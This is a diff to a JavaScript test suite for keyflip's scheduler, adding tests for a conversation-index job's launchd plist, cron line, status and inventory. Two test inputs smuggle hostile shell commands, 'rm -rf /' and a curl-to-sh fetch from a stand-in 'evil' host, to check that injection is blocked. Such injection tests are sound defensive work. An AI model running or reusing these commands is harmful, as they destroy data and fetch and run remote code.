@@ -112,7 +112,7 @@ test('the schedule records which LLM provider it will spend, and drops the recor
   // It lives in the state dir (a git repo), so it must be metadata-only + private.
   const file = path.join(configDir, schedule.RECORD_NAME);
   assert.match(fs.readFileSync(file, 'utf8'), /ollama/);
-  assert.strictEqual(fs.statSync(file).mode & 0o777, 0o600, 'the record is 0600');
+  if (process.platform !== 'win32') assert.strictEqual(fs.statSync(file).mode & 0o777, 0o600, 'the record is 0600');
   schedule.uninstall(ctx, { home: home, run: runner });
   assert.strictEqual(fs.existsSync(file), false, 'unscheduling drops the record');
   assert.strictEqual(schedule.status(ctx, { home: home, run: runner }).recorded, null);
@@ -194,7 +194,7 @@ test('the refresh command line is a fixed argv — nothing from opts can ride in
 
 test('every scheduled job declares AbandonProcessGroup and its own log paths', function () {
   const home = fs.mkdtempSync(path.join(os.tmpdir(), 'keyflip-sched-'));
-  ['dream', 'refresh'].forEach(function (job) {
+  ['dream', 'refresh', 'conv'].forEach(function (job) {
     const plist = schedule.buildPlist({ job: job, home: home, run: fakeRunner([], {}) });
     // Verified live: launchd kills the job's whole process group when the job exits, which murdered
     // the detached workers a scheduled dream used to start. A schedule without this is a silent loss.
@@ -202,7 +202,8 @@ test('every scheduled job declares AbandonProcessGroup and its own log paths', f
     assert.ok(plist.indexOf('<key>StandardOutPath</key>') !== -1, job + ' stdout is captured');
     assert.ok(plist.indexOf('<key>StandardErrorPath</key>') !== -1, job + ' stderr is captured');
     assert.ok(
-      plist.indexOf('Library/Logs/' + job + '-keyflip.log') !== -1,
+      plist.indexOf('Library/Logs/' + job + '-keyflip.log') !== -1 ||
+        plist.indexOf(['Library', 'Logs', job + '-keyflip.log'].join('\\')) !== -1,
       job + ' logs under its own name — a job nobody can read after it ran cannot be debugged',
     );
   });
@@ -318,4 +319,196 @@ test('ProgramArguments are the full command: a .js bin is run as `node <script> 
   // 3) The Linux line is the same command, shell-joined.
   const cl = schedule.cronLine({ job: 'refresh', run: noKeyflip });
   assert.ok(cl.indexOf(process.execPath + ' ' + repoBin + ' refresh --all') !== -1, cl);
+});
+
+// The conversation index is refreshed on an INTERVAL, not at a wall-clock time: search must find
+// the chat you just had, not the chat you had before lunch. A nightly job would be a day stale.
+test('the conversation-index job has its own label, marker, receipt and a default cadence', function () {
+  assert.strictEqual(schedule.CONV_LABEL, 'com.keyflip.conv-index');
+  assert.notStrictEqual(schedule.CONV_LABEL, schedule.LABEL);
+  assert.notStrictEqual(schedule.CONV_LABEL, schedule.REFRESH_LABEL);
+  assert.notStrictEqual(schedule.CONV_CRON_MARK, schedule.CRON_MARK);
+  assert.notStrictEqual(schedule.CONV_CRON_MARK, schedule.REFRESH_CRON_MARK);
+  assert.strictEqual(schedule.jobOf({ job: 'conv' }).name, 'conv');
+  assert.strictEqual(schedule.jobOf({ job: 'conv' }).record, 'conv-index-schedule.json');
+  // An interval job has no wall-clock time, so `whenOf` is null for it — the receipt keeps the
+  // cadence instead.
+  assert.strictEqual(schedule.whenOf({ job: 'conv' }), null);
+  assert.deepStrictEqual(schedule.whenOf({ job: 'dream' }), { h: 3, m: 0 }, 'the nightly jobs keep their hour');
+  assert.strictEqual(schedule.intervalOf({ job: 'conv' }), 30, 'the default cadence is every 30 min');
+  assert.strictEqual(schedule.intervalOf({ job: 'dream' }), null, 'a nightly job has no interval');
+});
+
+test('the index cadence accepts only values that mean the same thing in launchd and cron', function () {
+  assert.strictEqual(schedule.intervalOf({ job: 'conv', interval: 15 }), 15);
+  assert.strictEqual(schedule.intervalOf({ job: 'conv', interval: 60 }), 60);
+  assert.strictEqual(schedule.intervalOf({ job: 'conv', interval: 7 }), 30, 'an unsupported cadence falls back');
+  // A value that arrives from the MCP path is not a number: it must not become a cadence.
+  assert.strictEqual(schedule.intervalOf({ job: 'conv', interval: '30; rm -rf /' }), 30);
+  assert.strictEqual(schedule.intervalOf({ job: 'conv', interval: -5 }), 30);
+  assert.strictEqual(schedule.intervalOf({ job: 'conv', interval: 100000 }), 30);
+});
+
+test('the conversation-index plist uses StartInterval and the cron line uses */N minutes', function () {
+  const home = fs.mkdtempSync(path.join(os.tmpdir(), 'keyflip-sched-'));
+  const plist = schedule.buildPlist({ job: 'conv', home: home, run: fakeRunner([], {}) });
+  assert.ok(plist.indexOf('<key>StartInterval</key>') !== -1, plist);
+  assert.ok(plist.indexOf('<integer>1800</integer>') !== -1, '30 minutes, in seconds');
+  assert.ok(plist.indexOf('StartCalendarInterval') === -1, 'an interval job is not a nightly one');
+  assert.ok(plist.indexOf(schedule.CONV_LABEL) !== -1);
+  assert.ok(plist.indexOf('conv') !== -1 && plist.indexOf('--embed') !== -1);
+  const line = schedule.cronLine({ job: 'conv', interval: 60, run: fakeRunner([], {}) });
+  assert.ok(/^\*\/60 \* \* \* \* /.test(line), line);
+  assert.ok(line.indexOf(schedule.CONV_CRON_MARK) !== -1);
+  assert.strictEqual(line.indexOf('refresh'), -1, 'the index job must not quietly be the token refresh');
+});
+
+test('the conversation-index command line is a fixed argv — nothing from opts can ride into it', function () {
+  const runner = fakeRunner([], {});
+  const cmd = schedule.convCommand({ run: runner });
+  assert.deepStrictEqual(cmd.args, ['conv', 'index', '--embed']);
+  const noEmbed = schedule.convCommand({ run: runner, embed: false });
+  assert.deepStrictEqual(noEmbed.args, ['conv', 'index']);
+  const evil = schedule.cronLine({ job: 'conv', interval: '30 && curl http://evil/x | sh #', run: runner });
+  assert.strictEqual(evil.indexOf('curl'), -1);
+  assert.strictEqual(evil.indexOf('&&'), -1);
+  assert.strictEqual(evil.indexOf('| sh'), -1);
+});
+
+test('the conversation index coexists with the nightly jobs: three plists, three receipts', function () {
+  const home = fs.mkdtempSync(path.join(os.tmpdir(), 'keyflip-sched-'));
+  const configDir = path.join(home, '.config', 'keyflip');
+  fs.mkdirSync(configDir, { recursive: true });
+  const rec = [];
+  const runner = fakeRunner(rec, {});
+  const ctx = { platform: 'darwin', configDir: configDir };
+  assert.strictEqual(schedule.install(ctx, { job: 'dream', at: '03:00', home: home, run: runner }).ok, true);
+  assert.strictEqual(schedule.install(ctx, { job: 'refresh', at: '04:30', home: home, run: runner }).ok, true);
+  assert.strictEqual(schedule.install(ctx, { job: 'conv', interval: 30, home: home, run: runner }).ok, true);
+  const paths = ['dream', 'refresh', 'conv'].map(function (j) {
+    return schedule.plistPath(home, { job: j });
+  });
+  assert.strictEqual(new Set(paths).size, 3, 'three jobs, three plists — sharing one path would clobber the others');
+  paths.forEach(function (p) {
+    assert.ok(fs.existsSync(p), p);
+  });
+  const crec = schedule.status(ctx, { job: 'conv', home: home, run: runner }).recorded;
+  assert.strictEqual(crec.job, 'conv');
+  assert.strictEqual(crec.interval, 30, 'the receipt says how fresh the index is');
+  assert.strictEqual(crec.at, null, 'an interval job has no wall-clock hour');
+  assert.strictEqual(crec.provider, undefined, 'it runs a local embedding model, not a subscription');
+  // Removing the index job must leave the nightly ones alone.
+  schedule.uninstall(ctx, { job: 'conv', home: home, run: runner });
+  assert.strictEqual(fs.existsSync(paths[2]), false, 'the index plist is gone');
+  assert.strictEqual(fs.existsSync(paths[0]), true, 'the dream is still scheduled');
+  assert.strictEqual(fs.existsSync(paths[1]), true, 'the token refresh is still scheduled');
+  assert.strictEqual(fs.existsSync(path.join(configDir, 'conv-index-schedule.json')), false);
+  assert.strictEqual(schedule.status(ctx, { job: 'conv', home: home, run: runner }).installed, false);
+});
+
+// ---- "scheduled" is not "running" -------------------------------------------------------------
+// A plist on disk is an INSTRUCTION; launchd holding that instruction is the fact that matters, and
+// the two come apart in real life (a logout, a moved repo, an edited plist, a job installed by a
+// version that crashed on load). These tests pin that they are separate fields, that `askSystem:false`
+// claims nothing at all, and that a job's own log is the only evidence it ever spoke.
+function loadedRunner(loadedLabels) {
+  return function (cmd, args) {
+    if (cmd === 'launchctl' && args[0] === 'list') {
+      const label = args[1];
+      if (loadedLabels.indexOf(label) !== -1) return { code: 0, stdout: '{\n\t"Label" = "' + label + '";\n}\n' };
+      return { code: 113, stdout: '', stderr: 'Could not find service "' + label + '" in domain\n' };
+    }
+    if (cmd === 'which') return { code: 0, stdout: '/usr/local/bin/keyflip\n' };
+    return { code: 0, stdout: '' };
+  };
+}
+
+function seededHome(job) {
+  const home = fs.mkdtempSync(path.join(os.tmpdir(), 'keyflip-sched-'));
+  const configDir = path.join(home, '.config', 'keyflip');
+  fs.mkdirSync(configDir, { recursive: true });
+  const ctx = { platform: 'darwin', configDir: configDir, home: home };
+  return { home: home, configDir: configDir, ctx: ctx, job: job };
+}
+
+test('installed and loaded are two facts, and not-asked is a third', function () {
+  const s = seededHome('conv');
+  schedule.install(s.ctx, { job: 'conv', interval: 30, home: s.home, run: loadedRunner([]) });
+  const held = schedule.status(s.ctx, { job: 'conv', home: s.home, run: loadedRunner([schedule.CONV_LABEL]) });
+  assert.strictEqual(held.installed, true);
+  assert.strictEqual(held.loaded, true, 'launchd names the job, so it will fire');
+  const orphan = schedule.status(s.ctx, { job: 'conv', home: s.home, run: loadedRunner([]) });
+  assert.strictEqual(orphan.installed, true, 'the plist is still on disk');
+  assert.strictEqual(orphan.loaded, false, 'but launchd does not hold it — the job is decoration');
+  const notAsked = schedule.status(s.ctx, { job: 'conv', home: s.home, askSystem: false });
+  assert.strictEqual(notAsked.installed, true);
+  assert.strictEqual(notAsked.loaded, null, 'a caller that forbids the question must not get an answer');
+  const absent = schedule.status(s.ctx, { job: 'dream', home: s.home, run: loadedRunner([]) });
+  assert.strictEqual(absent.installed, false);
+  assert.strictEqual(absent.loaded, false, 'nothing installed cannot be loaded either');
+});
+
+test('a job answers only from the log it wrote — an unwritten log is null, not "ran"', function () {
+  const s = seededHome('conv');
+  schedule.install(s.ctx, { job: 'conv', interval: 30, home: s.home, run: loadedRunner([schedule.CONV_LABEL]) });
+  const runner = loadedRunner([schedule.CONV_LABEL]);
+  assert.strictEqual(schedule.status(s.ctx, { job: 'conv', home: s.home, run: runner }).lastRun, null);
+  const log = schedule.logPath(s.home, { job: 'conv' });
+  fs.mkdirSync(path.dirname(log), { recursive: true });
+  fs.writeFileSync(log, 'indexed 3 conversations\n');
+  const when = new Date(Date.parse('2026-03-04T05:06:07.000Z'));
+  fs.utimesSync(log, when, when);
+  assert.strictEqual(schedule.status(s.ctx, { job: 'conv', home: s.home, run: runner }).lastRun, when.toISOString());
+});
+
+test('the inventory is every schedulable job, with what it is for and how to install it', function () {
+  const s = seededHome('conv');
+  const runner = loadedRunner([schedule.CONV_LABEL]);
+  schedule.install(s.ctx, { job: 'conv', interval: 30, home: s.home, run: runner });
+  schedule.install(s.ctx, { job: 'dream', at: '03:00', home: s.home, run: runner });
+  const rows = schedule.inventory(s.ctx, { home: s.home, run: runner });
+  assert.strictEqual(rows.length, Object.keys(schedule.JOBS).length, 'every job in the table appears');
+  const by = {};
+  rows.forEach(function (r) {
+    by[r.job] = r;
+  });
+  ['dream', 'refresh', 'daemon', 'conv'].forEach(function (j) {
+    assert.ok(by[j], 'job ' + j + ' is inventoried');
+    assert.ok(by[j].does, 'and says what it does');
+    assert.ok(/^keyflip /.test(by[j].install), 'and how to install it');
+  });
+  assert.strictEqual(by.conv.installed, true);
+  assert.strictEqual(by.conv.loaded, true);
+  assert.strictEqual(by.conv.everyMinutes, 30, 'the cadence comes from the receipt, not the default');
+  assert.strictEqual(by.conv.cadenceMs, 30 * 60000);
+  assert.strictEqual(by.dream.cadenceMs, 24 * 3600 * 1000, 'a nightly job is aged against a day');
+  assert.strictEqual(by.daemon.cadenceMs, null, 'a KeepAlive daemon has no cadence to be silent against');
+  // The three cadence kinds are told apart in the normalized views, so no report can call the
+  // always-on daemon a "nightly" job or print a `{h,m}` object as if it were a time.
+  assert.strictEqual(by.conv.mode, 'interval');
+  assert.strictEqual(by.dream.mode, 'nightly');
+  assert.strictEqual(by.daemon.mode, 'continuous');
+  assert.strictEqual(by.dream.atLabel, '03:00', 'the nightly hour is a readable string from either source');
+  assert.strictEqual(by.daemon.atLabel, null, 'a daemon has no hour');
+  assert.strictEqual(by.refresh.installed, false);
+  assert.strictEqual(by.refresh.loaded, false, 'not installed, so plainly not loaded');
+  assert.ok(by.dream.installedAt, 'the inventory carries when the job was agreed to');
+});
+
+test('hhmm normalizes both shapes a schedule can be recorded in', function () {
+  assert.strictEqual(schedule.hhmm({ at: { h: 4, m: 5 } }, schedule.JOBS.refresh), '04:05', 'a parsed receipt');
+  assert.strictEqual(schedule.hhmm({ at: { h: 23, m: 0 } }, schedule.JOBS.dream), '23:00');
+  assert.strictEqual(schedule.hhmm(null, schedule.JOBS.refresh), '04:30', 'else the job default');
+  assert.strictEqual(schedule.hhmm(null, schedule.JOBS.daemon), null, 'and a daemon has none');
+});
+
+test('an interval job is aged against the interval it was INSTALLED with', function () {
+  const s = seededHome('conv');
+  const runner = loadedRunner([schedule.CONV_LABEL]);
+  schedule.install(s.ctx, { job: 'conv', interval: 5, home: s.home, run: runner });
+  const row = schedule.inventory(s.ctx, { home: s.home, run: runner }).filter(function (r) {
+    return r.job === 'conv';
+  })[0];
+  assert.strictEqual(row.everyMinutes, 5, '5 minutes promised is 5 minutes measured, not the 30 default');
+  assert.strictEqual(row.cadenceMs, 300000);
 });
